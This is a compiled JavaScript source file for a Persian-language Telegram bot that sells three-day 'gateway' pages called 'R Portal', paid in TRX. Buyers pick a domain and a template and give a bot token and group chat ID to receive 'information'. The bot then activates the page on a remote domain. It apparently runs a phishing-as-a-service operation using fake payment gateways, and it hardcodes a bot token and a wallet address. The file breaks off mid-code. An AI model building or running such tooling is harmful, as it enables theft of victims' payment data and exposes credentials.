"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g = Object.create((typeof Iterator === "function" ? Iterator : Object).prototype);
    return g.next = verb(0), g["throw"] = verb(1), g["return"] = verb(2), typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var main_token = "8441670596:AAFQVWOQI1c7TsG9sBrkBQiGp4QzEba6LyI";
var bot_wallet = "TCymMoexTgT2J6UMLq7rScRdj3BjhTM6kL";
var admins = [8086331339];
var database_1 = require("./database");
var tron_1 = require("./tron");
var trxweb = require("tronweb");
var fs = require("fs");
var path = require("path");
var axios = require("axios");
var Telegram = require("node-telegram-bot-api");
process.on("uncaughtException", function (uexcept) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.error(uexcept);
        return [2 /*return*/];
    });
}); });
process.on("uncaughtExceptionMonitor", function (uexceptmonitor) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.error(uexceptmonitor);
        return [2 /*return*/];
    });
}); });
process.on("unhandledRejection", function (unhandle) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.error(unhandle);
        return [2 /*return*/];
    });
}); });
var bot = new Telegram(main_token, { polling: true });
var userdb = new database_1.UserDatabase();
var hashdb = new database_1.HashDatabase();
var domaindb = new database_1.DomainDatabase();
var price = parseInt(fs.readFileSync(path.join(__dirname, "price.txt")).toString());
var que = new Map();
var got = new Map();
var inf = new Map();
var opt = new Map();
var cns = new Map();
var translationTable = {
    'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
    'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
    'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
    'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
    'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
    'm': 'ᴍ'
};
bot.on("message", function (message) { return __awaiter(void 0, void 0, void 0, function () {
    var userstep, _inf_1, _que_1, _url, pk_1, _url, coins;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                console.log(message);
                if (!message.from)
                    return [2 /*return*/];
                if (message.chat.type === 'channel')
                    return [2 /*return*/];
                message.text = message.text ? message.text : "";
                if (!(message.text.startsWith("/start") || message.text === "درگاه")) return [3 /*break*/, 3];
                return [4 /*yield*/, userdb.add(message.from.id, function (t) { console.log(t); })];
            case 1:
                _a.sent();
                return [4 /*yield*/, domaindb.getDomains(function (domains) { return __awaiter(void 0, void 0, void 0, function () {
                        var ghalebs, _i, domains_1, _d, _a, _b, __d;
                        return __generator(this, function (_c) {
                            switch (_c.label) {
                                case 0:
                                    ghalebs = new Set();
                                    for (_i = 0, domains_1 = domains; _i < domains_1.length; _i++) {
                                        _d = domains_1[_i];
                                        for (_a = 0, _b = _d.includes; _a < _b.length; _a++) {
                                            __d = _b[_a];
                                            ghalebs.add(__d);
                                        }
                                    }
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83E\uDDFD | \u0631\u0628\u0627\u062A \u062E\u0631\u06CC\u062F \u062F\u0631\u06AF\u0627\u0647 \uD835\uDE81 \uD835\uDE7F\uD835\uDE98\uD835\uDE9B\uD835\uDE9D\uD835\uDE8A\uD835\uDE95\n\n\uD83D\uDCC1 | \u0642\u0627\u0644\u0628: ".concat(ghalebs.size, " | \u062F\u0627\u0645\u06CC\u0646: ").concat(domains.length, "\n\uD83D\uDDA5\uFE0F | \u062A\u0636\u0645\u06CC\u0646 3 \u0631\u0648\u0632 \u0642\u06CC\u0645\u062A ").concat(price, " \u062A\u0631\u0648\u0646\n\uD83D\uDCB0 | \u0648\u0644\u062A \u0628\u0627\u062A: <code>").concat(bot_wallet, "</code>"), {
                                            parse_mode: "HTML",
                                            reply_to_message_id: message.message_id,
                                            reply_markup: {
                                                inline_keyboard: [
                                                    [{ text: '🪙 خرید 🪙', callback_data: "buy_".concat(message.from.id) }]
                                                ]
                                            }
                                        })];
                                case 1: return [2 /*return*/, _c.sent()];
                            }
                        });
                    }); })];
            case 2:
                _a.sent();
                return [3 /*break*/, 12];
            case 3:
                if (!message.text.startsWith("/help")) return [3 /*break*/, 4];
                return [2 /*return*/, bot.sendMessage(message.chat.id, "/hash <HASH> : شارژ کردن حساب خودتون با ارسال هش تراکنش (فقط واریزی های 24 ساعت قبل قبول میشن)\n/wallet : مقداری که حسابتون شارژ شده\n/cancel : کنسل کردن پروسه", {
                        reply_to_message_id: message.message_id
                    })];
            case 4:
                if (!message.text.startsWith("/wallet")) return [3 /*break*/, 6];
                return [4 /*yield*/, userdb.getUserById(message.from.id, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!user) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "اول /start رو بفرست", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83C\uDF00 wallet : ".concat(user.coins), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 3: return [2 /*return*/, _a.sent()];
                            }
                        });
                    }); })];
            case 5:
                _a.sent();
                return [3 /*break*/, 12];
            case 6:
                if (!message.text.startsWith("/cancel")) return [3 /*break*/, 8];
                return [4 /*yield*/, userdb.getUserById(message.from.id, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!user) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "اول /start رو بفرست", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    if (inf.has(message.from.id)) {
                                        inf.delete(message.from.id);
                                    }
                                    if (got.has(message.from.id)) {
                                        got.delete(message.from.id);
                                    }
                                    if (que.has(message.from.id)) {
                                        que.delete(message.from.id);
                                    }
                                    if (opt.has(message.from.id)) {
                                        opt.delete(message.from.id);
                                    }
                                    return [2 /*return*/, bot.sendMessage(message.chat.id, "\u2705 | \u062A\u0645\u0627\u0645\u06CC \u067E\u0631\u0648\u0633\u0647 \u0647\u0627\u06CC \u0634\u0645\u0627 \u067E\u0627\u06A9 \u0634\u062F\u0646\u062F", {
                                            reply_to_message_id: message.message_id
                                        })];
                            }
                        });
                    }); })];
            case 7:
                _a.sent();
                return [3 /*break*/, 12];
            case 8:
                if (!message.text.startsWith("/hash")) return [3 /*break*/, 10];
                return [4 /*yield*/, userdb.getUserById(message.from.id, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        var hash;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!user) return [3 /*break*/, 2];
                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "اول /start رو بفرست", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    hash = message.text.slice(6).trim();
                                    if (!(hash.length === 0)) return [3 /*break*/, 3];
                                    return [2 /*return*/, bot.sendMessage(message.chat.id, "\u062C\u0644\u0648\u06CC /hash \u0647\u0634 \u062A\u0631\u0627\u06A9\u0646\u0634 \u0631\u0648 \u0627\u0631\u0633\u0627\u0644 \u06A9\u0646\u06CC\u062F", {
                                            reply_to_message_id: message.message_id
                                        })];
                                case 3: return [4 /*yield*/, hashdb.exists(hash, function (doesExist) { return __awaiter(void 0, void 0, void 0, function () {
                                        return __generator(this, function (_a) {
                                            switch (_a.label) {
                                                case 0:
                                                    if (!doesExist) return [3 /*break*/, 2];
                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u0627\u06CC\u0646 \u0647\u0634 \u0642\u0628\u0644\u0627 \u062B\u0628\u062A \u0634\u062F\u0647", {
                                                            reply_to_message_id: message.message_id
                                                        })];
                                                case 1: return [2 /*return*/, _a.sent()];
                                                case 2: return [4 /*yield*/, (0, tron_1.getTransactionByHash)(hash).then(function (tx) { return __awaiter(void 0, void 0, void 0, function () {
                                                        var haspassed, amount, real_amount_1;
                                                        return __generator(this, function (_a) {
                                                            switch (_a.label) {
                                                                case 0:
                                                                    if (!tx.tx.Error) return [3 /*break*/, 2];
                                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u062A\u0631\u0627\u06A9\u0646\u0634 \u0627\u0634\u062A\u0628\u0627\u0647\u0647", {
                                                                            reply_to_message_id: message.message_id
                                                                        })];
                                                                case 1: return [2 /*return*/, _a.sent()];
                                                                case 2:
                                                                    haspassed = has24HoursPassed(tx.tx.raw_data.timestamp);
                                                                    if (!haspassed) return [3 /*break*/, 4];
                                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u0627\u0632 \u062A\u0631\u0627\u06A9\u0646\u0634 \u0628\u06CC\u0634\u062A\u0631 \u0627\u0632 \u06F2\u06F4 \u0645\u06CC\u06AF\u0630\u0631\u062F, \u0637\u0628\u0642 \u0642\u0648\u0627\u0646\u06CC\u0646 \u062F\u0631\u06AF\u0627\u0647 \u0633\u0627\u0632 R Portal \u062A\u0631\u0627\u06A9\u0646\u0634 \u0647\u0627\u06CC\u06CC \u06A9\u0647 \u0627\u0632 \u06F2\u06F4 \u0633\u0627\u0639\u062A \u06AF\u0630\u0634\u062A\u0646 \u0633\u062A \u0646\u0645\u06CC\u0634\u0646", {
                                                                            reply_to_message_id: message.message_id
                                                                        })];
                                                                case 3: return [2 /*return*/, _a.sent()];
                                                                case 4:
                                                                    amount = tx.tx.raw_data.contract[0].parameter.value.amount;
                                                                    real_amount_1 = trxweb.TronWeb.fromSun(amount);
                                                                    if (!!real_amount_1) return [3 /*break*/, 6];
                                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 \u0645\u0642\u062F\u0627\u0631 \u062A\u0631\u0627\u06A9\u0646\u0634 \u063A\u06CC\u0631\u0642\u0627\u0628\u0644 \u062F\u06CC\u062F\u0646 \u0645\u06CC\u0628\u0627\u0634\u062F", {
                                                                            reply_to_message_id: message.message_id
                                                                        })];
                                                                case 5: return [2 /*return*/, _a.sent()];
                                                                case 6: return [4 /*yield*/, userdb.charge(message.from.id, Math.floor(parseInt(real_amount_1.toString())), function (d) { return __awaiter(void 0, void 0, void 0, function () {
                                                                        return __generator(this, function (_a) {
                                                                            switch (_a.label) {
                                                                                case 0:
                                                                                    if (!d.status) return [3 /*break*/, 2];
                                                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 \u0645\u0642\u062F\u0627\u0631 ".concat(real_amount_1, " \u062D\u0633\u0627\u0628\u062A \u0631\u0648 \u0634\u0627\u0631\u0698 \u06A9\u0631\u062F"), {
                                                                                            reply_to_message_id: message.message_id
                                                                                        })];
                                                                                case 1: return [2 /*return*/, _a.sent()];
                                                                                case 2: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 ".concat(d.message), {
                                                                                        reply_to_message_id: message.message_id
                                                                                    })];
                                                                                case 3: return [2 /*return*/, _a.sent()];
                                                                            }
                                                                        });
                                                                    }); })];
                                                                case 7:
                                                                    _a.sent();
                                                                    _a.label = 8;
                                                                case 8: return [2 /*return*/];
                                                            }
                                                        });
                                                    }); })];
                                                case 3:
                                                    _a.sent();
                                                    return [2 /*return*/];
                                            }
                                        });
                                    }); })];
                                case 4:
                                    _a.sent();
                                    _a.label = 5;
                                case 5: return [2 /*return*/];
                            }
                        });
                    }); })];
            case 9:
                _a.sent();
                return [3 /*break*/, 12];
            case 10:
                if (!message.text.startsWith("/admin")) return [3 /*break*/, 12];
                if (!admins.includes(message.from.id)) return [3 /*break*/, 12];
                return [4 /*yield*/, bot.sendMessage(message.chat.id, "👤 | پنل ادمین", {
                        reply_to_message_id: message.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: build("\uD83D\uDD3A ban \uD83D\uDD3A"), callback_data: "ban_".concat(message.from.id) }, { text: build('🔹 unban 🔹'), callback_data: "unban_".concat(message.from.id) }],
                                [{ text: build("\uD83D\uDCAC broadcast \uD83D\uDCAC"), callback_data: "brcast_".concat(message.from.id) }],
                                [{ text: build("\uD83D\uDD17 add domain \uD83D\uDD17"), callback_data: "adddomain_".concat(message.from.id) }, { text: build("\u2702\uFE0F del domain \u2702\uFE0F"), callback_data: "deldomain_".concat(message.from.id) }],
                                [{ text: build("\uD83D\uDD2E add skin \uD83D\uDD2E"), callback_data: "addskin_".concat(message.from.id) }, { text: build("\uD83E\uDE93 del skin \uD83E\uDE93"), callback_data: "delskin_".concat(message.from.id) }],
                                [{ text: build("\uD83D\uDCB0 change price \uD83D\uDCB0"), callback_data: "changeprice_".concat(message.from.id) }, { text: build("\uD83C\uDF00 domains \uD83C\uDF00"), callback_data: "cdomains_".concat(message.from.id) }],
                                [{ text: build("\uD83E\uDE99 free coins \uD83E\uDE99"), callback_data: "freecoins_".concat(message.from.id) }]
                            ]
                        }
                    })];
            case 11: return [2 /*return*/, _a.sent()];
            case 12:
                if (!got.has(message.from.id)) return [3 /*break*/, 52];
                userstep = got.get(message.from.id);
                if (!(userstep === "gettoken")) return [3 /*break*/, 14];
                if (message.text.length === 0) {
                    return [2 /*return*/];
                }
                inf.set(message.from.id, { token: message.text });
                got.set(message.from.id, "getchat");
                return [4 /*yield*/, bot.sendMessage(message.chat.id, "چت آیدی گروهتون جهت ارسال اطلاعات به اونجا رو ارسال کنید", {
                        reply_to_message_id: message.message_id
                    })];
            case 13: return [2 /*return*/, _a.sent()];
            case 14:
                if (!(userstep === "getchat")) return [3 /*break*/, 16];
                if (!/^-?\d+$/.test(message.text)) {
                    return [2 /*return*/];
                }
                _inf_1 = inf.get(message.from.id);
                _inf_1.chat = parseInt(message.text);
                inf.set(message.from.id, _inf_1);
                got.delete(message.from.id);
                _que_1 = que.get(message.from.id);
                que.delete(message.from.id);
                inf.delete(message.from.id);
                return [4 /*yield*/, domaindb.getDomainByID(_que_1.domain_id, function (domain) { return __awaiter(void 0, void 0, void 0, function () {
                        var dtype, theurl, orgspl;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!!domain) return [3 /*break*/, 2];
                                    return [4 /*yield*/, userdb.charge(message.from.id, price, function () { return __awaiter(void 0, void 0, void 0, function () {
                                            return __generator(this, function (_a) {
                                                switch (_a.label) {
                                                    case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "🔴 | دامین از سمت ادمین ها حذف شد, لطفا دامین دیگه ای انتخاب کنید (پول شما برگردانده میشود)", {
                                                            reply_to_message_id: message.message_id
                                                        })];
                                                    case 1:
                                                        _a.sent();
                                                        return [2 /*return*/];
                                                }
                                            });
                                        }); })];
                                case 1: return [2 /*return*/, _a.sent()];
                                case 2:
                                    theurl = new URL(domain.durl);
                                    orgspl = theurl.origin.split(".");
                                    dtype = orgspl[orgspl.length - 1];
                                    _a.label = 3;
                                case 3: return [4 /*yield*/, userdb.addPort(message.from.id, {
                                        bought_on: Date.now(),
                                        token: _inf_1.token,
                                        chat: _inf_1.chat,
                                        type: _que_1.skin,
                                        domain_type: dtype
                                    }, function (stat) { return __awaiter(void 0, void 0, void 0, function () {
                                        return __generator(this, function (_a) {
                                            switch (_a.label) {
                                                case 0:
                                                    if (!stat.status) {
                                                        return [2 /*return*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | ".concat(stat.message), {
                                                                reply_to_message_id: message.message_id
                                                            })];
                                                    }
                                                    return [4 /*yield*/, domaindb.addInclude(domain.id, stat.port.name, function () { })];
                                                case 1:
                                                    _a.sent();
                                                    return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 \u067E\u0648\u0631\u062A \u0628\u0627 \u0645\u0648\u0641\u0642\u06CC\u062A \u062F\u0631 \u062F\u06CC\u062A\u0627\u0628\u06CC\u0633 \u062B\u0628\u062A \u0634\u062F\n\n\uD83D\uDD87\uFE0F | \u067E\u0648\u0631\u062A : <code>".concat(stat.port.name, "</code>\n\u23F3 | \u062E\u0631\u06CC\u062F\u0627\u0631\u06CC \u0634\u062F\u0647 \u062F\u0631 ").concat(new Date(), "\n\uD83D\uDD87\uFE0F | \u062F\u0627\u0645\u06CC\u0646 : ").concat(dtype, "\n\uD83E\uDE84 | \u0642\u0627\u0644\u0628 : ").concat(_que_1.skin, "\n\uD83D\uDCAC | \u0686\u062A : ").concat(_inf_1.chat, "\n\uD83E\uDD16 | \u062A\u0648\u06A9\u0646 : <code>").concat(_inf_1.token, "</code>\n\n\uD83D\uDD2E | \u06CC\u06A9 \u062F\u0642\u06CC\u0642\u0647 \u0648 \u0633\u06CC \u062B\u0627\u0646\u06CC\u0647 \u0635\u0628\u0631 \u06A9\u0646\u06CC\u062F \u062A\u0627 \u062F\u0631\u06AF\u0627\u0647\u062A\u0648\u0646 \u0622\u0646\u0644\u0627\u06CC\u0646 \u0628\u0634\u0647"), {
                                                            reply_to_message_id: message.message_id,
                                                            parse_mode: "HTML"
                                                        }).then(function () { return __awaiter(void 0, void 0, void 0, function () {
                                                            return __generator(this, function (_a) {
                                                                setTimeout(function () { return __awaiter(void 0, void 0, void 0, function () {
                                                                    return __generator(this, function (_a) {
                                                                        switch (_a.label) {
                                                                            case 0: return [4 /*yield*/, axios.post(domain.durl + "/add-dargah", { port: stat.port.name, skin: _que_1.skin, domain: domain.durl }, {
                                                                                    headers: {
                                                                                        "Content-Type": "application/json"
                                                                                    }
                                                                                }).then(function (resp) { return __awaiter(void 0, void 0, void 0, function () {
                                                                                    var _d, e_1;
                                                                                    return __generator(this, function (_a) {
                                                                                        switch (_a.label) {
                                                                                            case 0:
                                                                                                console.log(resp.status);
                                                                                                console.log(resp.data);
                                                                                                _d = resp.data;
                                                                                                _a.label = 1;
                                                                                            case 1:
                                                                                                _a.trys.push([1, 6, , 8]);
                                                                                                if (!_d.status) return [3 /*break*/, 3];
                                                                                                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u2705 | \u062F\u0631\u06AF\u0627\u0647 \u0622\u0646\u0644\u0627\u06CC\u0646 \u0634\u062F\n\n\uD83D\uDD87\uFE0F | \u0644\u06CC\u0646\u06A9 : ".concat(_d.on))];
                                                                                            case 2: return [2 /*return*/, _a.sent()];
                                                                                            case 3: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | ".concat(_d.message))];
                                                                                            case 4: return [2 /*return*/, _a.sent()];
                                                                                            case 5: return [3 /*break*/, 8];
                                                                                            case 6:
                                                                                                e_1 = _a.sent();
                                                                                                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | ".concat(e_1))];
                                                                                            case 7: return [2 /*return*/, _a.sent()];
                                                                                            case 8: return [2 /*return*/];
                                                                                        }
                                                                                    });
                                                                                }); }).catch(function (e) { return __awaiter(void 0, void 0, void 0, function () {
                                                                                    return __generator(this, function (_a) {
                                                                                        switch (_a.label) {
                                                                                            case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | ".concat(e))];
                                                                                            case 1: return [2 /*return*/, _a.sent()];
                                                                                        }
                                                                                    });
                                                                                }); })];
                                                                            case 1:
                                                                                _a.sent();
                                                                                return [2 /*return*/];
                                                                        }
                                                                    });
                                                                }); }, 90000);
                                                                return [2 /*return*/];
                                                            });
                                                        }); })];
                                                case 2:
                                                    _a.sent();
                                                    return [2 /*return*/];
                                            }
                                        });
                                    }); })];
                                case 4:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 15:
                _a.sent();
                return [3 /*break*/, 52];
            case 16:
                if (!(userstep === "banuser")) return [3 /*break*/, 21];
                if (!/^\d+$/.test(message.text)) return [3 /*break*/, 18];
                got.delete(message.from.id);
                return [4 /*yield*/, userdb.ban(parseInt(message.text), function (d) { return __awaiter(void 0, void 0, void 0, function () {
                        var _a;
                        return __generator(this, function (_b) {
                            switch (_b.label) {
                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(d.status === true ? '✅' : '🔴', " | ").concat((_a = d.message) !== null && _a !== void 0 ? _a : "کاربر با موفقیت بن شد"), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 1: return [2 /*return*/, _b.sent()];
                            }
                        });
                    }); })];
            case 17:
                _a.sent();
                return [3 /*break*/, 20];
            case 18: return [4 /*yield*/, userdb.getUserByPort(message.text, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                    return __generator(this, function (_a) {
                        switch (_a.label) {
                            case 0:
                                if (!!user) return [3 /*break*/, 2];
                                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | \u06A9\u0627\u0631\u0628\u0631 \u062F\u0631 \u062F\u06CC\u062A\u0627\u0628\u06CC\u0633 \u062B\u0628\u062A \u0646\u0634\u062F\u0647", {
                                        reply_to_message_id: message.message_id
                                    })];
                            case 1: return [2 /*return*/, _a.sent()];
                            case 2: return [4 /*yield*/, userdb.ban(user.id, function (d) { return __awaiter(void 0, void 0, void 0, function () {
                                    var _a;
                                    return __generator(this, function (_b) {
                                        switch (_b.label) {
                                            case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(d.status === true ? '✅' : '🔴', " | ").concat((_a = d.message) !== null && _a !== void 0 ? _a : "کاربر با موفقیت بن شد"), {
                                                    reply_to_message_id: message.message_id
                                                })];
                                            case 1: return [2 /*return*/, _b.sent()];
                                        }
                                    });
                                }); })];
                            case 3:
                                _a.sent();
                                return [2 /*return*/];
                        }
                    });
                }); })];
            case 19:
                _a.sent();
                _a.label = 20;
            case 20: return [3 /*break*/, 52];
            case 21:
                if (!(userstep === "unbanuser")) return [3 /*break*/, 26];
                if (!/^\d+$/.test(message.text)) return [3 /*break*/, 23];
                got.delete(message.from.id);
                return [4 /*yield*/, userdb.unban(parseInt(message.text), function (d) { return __awaiter(void 0, void 0, void 0, function () {
                        var _a;
                        return __generator(this, function (_b) {
                            switch (_b.label) {
                                case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(d.status === true ? '✅' : '🔴', " | ").concat((_a = d.message) !== null && _a !== void 0 ? _a : "کاربر با موفقیت بن شد"), {
                                        reply_to_message_id: message.message_id
                                    })];
                                case 1: return [2 /*return*/, _b.sent()];
                            }
                        });
                    }); })];
            case 22:
                _a.sent();
                return [3 /*break*/, 25];
            case 23: return [4 /*yield*/, userdb.getUserByPort(message.text, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                    return __generator(this, function (_a) {
                        switch (_a.label) {
                            case 0:
                                if (!!user) return [3 /*break*/, 2];
                                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | \u06A9\u0627\u0631\u0628\u0631 \u062F\u0631 \u062F\u06CC\u062A\u0627\u0628\u06CC\u0633 \u062B\u0628\u062A \u0646\u0634\u062F\u0647", {
                                        reply_to_message_id: message.message_id
                                    })];
                            case 1: return [2 /*return*/, _a.sent()];
                            case 2: return [4 /*yield*/, userdb.unban(user.id, function (d) { return __awaiter(void 0, void 0, void 0, function () {
                                    var _a;
                                    return __generator(this, function (_b) {
                                        switch (_b.label) {
                                            case 0: return [4 /*yield*/, bot.sendMessage(message.chat.id, "".concat(d.status === true ? '✅' : '🔴', " | ").concat((_a = d.message) !== null && _a !== void 0 ? _a : "کاربر با موفقیت آن بن شد"), {
                                                    reply_to_message_id: message.message_id
                                                })];
                                            case 1: return [2 /*return*/, _b.sent()];
                                        }
                                    });
                                }); })];
                            case 3:
                                _a.sent();
                                return [2 /*return*/];
                        }
                    });
                }); })];
            case 24:
                _a.sent();
                _a.label = 25;
            case 25: return [3 /*break*/, 52];
            case 26:
                if (!(userstep === "brdcastmessage")) return [3 /*break*/, 28];
                got.delete(message.from.id);
                return [4 /*yield*/, bot.sendMessage(message.chat.id, "\u06A9\u0645\u06CC \u0635\u0628\u0631 ...", {
                        reply_to_message_id: message.message_id
                    }).then(function (newMsg) { return __awaiter(void 0, void 0, void 0, function () {
                        var _sent_chats;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    _sent_chats = 0;
                                    return [4 /*yield*/, userdb.getUsers(function (users) { return __awaiter(void 0, void 0, void 0, function () {
                                            var __sents, _i, users_1, user, _a, _b, up;
                                            return __generator(this, function (_c) {
                                                switch (_c.label) {
                                                    case 0:
                                                        __sents = [];
                                                        _i = 0, users_1 = users;
                                                        _c.label = 1;
                                                    case 1:
                                                        if (!(_i < users_1.length)) return [3 /*break*/, 7];
                                                        user = users_1[_i];
                                                        if (__sents.includes(user.id)) {
                                                            return [3 /*break*/, 6];
                                                        }
                                                        __sents.push(user.id);
                                                        return [4 /*yield*/, bot.forwardMessage(user.id, message.chat.id, message.message_id)];
                                                    case 2:
                                                        _c.sent();
                                                        _sent_chats += 1;
                                                        _a = 0, _b = user.port;
                                                        _c.label = 3;
                                                    case 3:
                                                        if (!(_a < _b.length)) return [3 /*break*/, 6];
                                                        up = _b[_a];
                                                        if (__sents.includes(up.chat)) {
                                                            return [3 /*break*/, 5];
                                                        }
                                                        __sents.push(up.chat);
                                                        return [4 /*yield*/, bot.forwardMessage(user.id, up.chat, message.message_id)];
                                                    case 4:
                                                        _c.sent();
                                                        _sent_chats += 1;
                                                        _c.label = 5;
                                                    case 5:
                                                        _a++;
                                                        return [3 /*break*/, 3];
                                                    case 6:
                                                        _i++;
                                                        return [3 /*break*/, 1];
                                                    case 7: return [4 /*yield*/, bot.editMessageText("\u2705 | \u067E\u06CC\u0627\u0645 \u0628\u0647 ".concat(_sent_chats, " \u06AF\u0631\u0648\u0647/\u067E\u06CC\u0648\u06CC \u0627\u0631\u0633\u0627\u0644 \u0634\u062F"), {
                                                            chat_id: newMsg.chat.id,
                                                            message_id: newMsg.message_id
                                                        })];
                                                    case 8: return [2 /*return*/, _c.sent()];
                                                }
                                            });
                                        }); })];
                                case 1:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 27:
                _a.sent();
                return [3 /*break*/, 52];
            case 28:
                if (!(userstep === "adddomain")) return [3 /*break*/, 31];
                if (!(message.text.length !== 0)) return [3 /*break*/, 30];
                if (!/^https?:\/\/(?:(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?::\d{1,5})?(?:\/[^\s]*)?$/.test(message.text)) {
                    return [2 /*return*/];
                }
                _url = new URL(message.text);
                pk_1 = crypto.randomUUID();
                got.delete(message.from.id);
                return [4 /*yield*/, domaindb.addDomain(_url.origin, pk_1, function (data) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            if (data.status) {
                                return [2 /*return*/, bot.sendMessage(message.chat.id, "\u2705 | \u062F\u0627\u0645\u06CC\u0646 \u062C\u062F\u06CC\u062F \u0633\u062A \u0634\u062F\n\n\uD83D\uDD17 | \u0644\u06CC\u0646\u06A9 : <code>".concat(message.text, "</code>\n\u270F\uFE0F | \u06A9\u0644\u06CC\u062F/\u0622\u06CC\u062F\u06CC : <code>").concat(data.domain.id, "</code>\n\uD83E\uDE84 | \u06A9\u0644\u06CC\u062F \u0631\u062F \u0648 \u0628\u062F\u0644 \u06A9\u0631\u062F\u0646 \u0627\u0637\u0644\u0627\u0639\u0627\u062A : <code>").concat(pk_1, "</code>"), {
                                        reply_to_message_id: message.message_id,
                                        parse_mode: "HTML"
                                    })];
                            }
                            else {
                                return [2 /*return*/, bot.sendMessage(message.chat.id, "\uD83D\uDD34 | ".concat(data.message), {
